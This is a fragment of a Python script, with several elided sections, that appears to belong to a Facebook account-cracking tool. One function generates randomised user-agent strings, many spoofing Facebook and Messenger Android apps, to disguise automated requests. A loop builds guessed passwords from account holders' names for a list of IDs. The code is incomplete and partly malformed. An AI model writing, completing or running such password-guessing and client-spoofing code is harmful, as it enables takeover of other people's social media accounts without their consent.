...
def ugenku(idf):
  ...
  ver_and, ver_ch = rc([f"{str(rr(1,9))}.0.1",f"{str(rr(1,9))}.5.5",f"{str(rr(1,9))}.1.1",f"{str(rr(1,9))}.0.0",f"{str(rr(5,14))}"]), rc([f"{str(rr(20,120))}.0.{str(rr(4200,7800))}.{str(rr(40,189))}",f"{str(rr(110,121))}.0.0.0",f"{str(rr(10,319))}.0.{str(rr(1999,5999))}.{str(rr(20,210))}"])
#  ver_bld = rc([f"PPR1.{str(rr(111111,299999))}.0.{str(rr(1,9))}0",f"SP1A.str(rr(111111,299999))}.0.{str(rr(1,9))}0"])
  gt = ['N4LEFH','TQ2A','QQ1B','PQ1A','SQ3A','RD1B','LDK2WU','SD2A','AB03E','Z367Q','R8638','C886H']
  ua1 = f"Mozilla/5.0 (Linux; U; Android {ver_and}; en-gb; CPH1859 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.0.9"
  ua2 = f"Mozilla/5.0 (Linux; Android {ver_and}; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver_ch} Mobile Safari/537.36"
  ua3 = f"Mozilla/5.0 (Linux; Android {ver_and}; V2249; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/11.4.0.1"
  ua4 = f"Mozilla/5.0 (Linux; Android {ver_and}; SM-G925F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ver_ch} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/170.0.0.52.95;]"
  ua5 = f"Mozilla/5.0 (Linux; Android {ver_and}; V2068; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/9.0.3.0"
  ua6 = f"viabrowser;Safary-Mozilla/5.0 (Windows NT 10.0 .{str(rr(1,20))}; WOW64){str(rc(gt))})Applewebkit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50,140))}.0.{str(rr(3990,5001))}.{str(rr(20,170))} Safari/537.36 Vivaldi/6.0.2979.18"
  ua7 = f"Mozilla/5.0 (Linux; Android {ver_and}; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36 OPR/61.2.3076.56749"
  ua8 = f"Mozilla/5.0 (Linux; Android {ver_and}; Redmi 5 Plus Build/OPM1.171019.019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.61 Mobile Safari/537.36"
  ua9 = f"Mozilla/5.0 (Linux; U; Android {ver_and}; zh-CN; Redmi Note 8 Pro Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/{str(rr(10,90))}.{str(rr(1,9))}.{str(rr(1,9))}.{str(rr(1000,1900))} Mobile Safari/537.36"
  ua10 = f"Dalvik/2.1.0 (Android {ver_and}; L-03K Build/PKQ1.190522.001) [FBAN/MessengerLite;FBAV/141.0.0.2.117;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/293513921;FBCR/Airtel;FBMF/LGE;FBBD/lge;Facebook/L-03K;FBSV/9;FBCA"
  ua11 = f"Mozilla/5.0 (Linux; U; Android {ver_and}; en-us; Karbonn A18+ Bulid/MocorDroid2.3.5) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/533.1 [FB_IAB/MESSENGER;FBAV/111.0.0.15.46;]"
  ua12 = f"Mozilla/5.0 (Linux; Android {str(strvrun(1,5))}.1.1; SM-J111F Build/LMY47V; rv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Rocket/1.0.0.1 Chrome/{str(strvrun(10,55))}.0.2883.91 Mobile Safari/537.36"
  ua13 = f"Dalvik/2.1.0 (Android {ver_and}; L-03K Build/PKQ1.190522.001) [FBAN/MessengerLite;FBAV/141.0.0.2.117;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/293513921;FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/L-03K;FBSV/9;FBCA"
  ua14 = f"Mozilla/5.0 (Linux; Android {ver_and}; SM-G770F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/407.0.0.30.97;]"
  ua15 = f"Mozilla/5.0 (Linux; Android {ver_and}; SM-J250F Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/288.0.0.15.118;]"
  ua16 = f"Mozilla/5.0 (Android 9; HUAWEI BLA-L29) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 SurfBrowser/3.0"
  ua17= f"Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/(density=3.0,width=1080,height=1920);FB_FW/1;]"
  return rc([ua1,ua2,ua3,ua4,ua5,ua6,ua7,ua8,ua9,ua10,ua11,ua12,ua13,ua14,ua15,ua16,ua17])
#--------[ GENERATE-USER-AGENT ]----------#
			...
			for _gabutz_ster_ in id2:
				...
				if len(namamu_ku_simpan)<6:
					if len(frestile)<3:
						...
						pwx.append(frestile+'kamu nanya')
						pwx.append(frestile+'kata sandi')
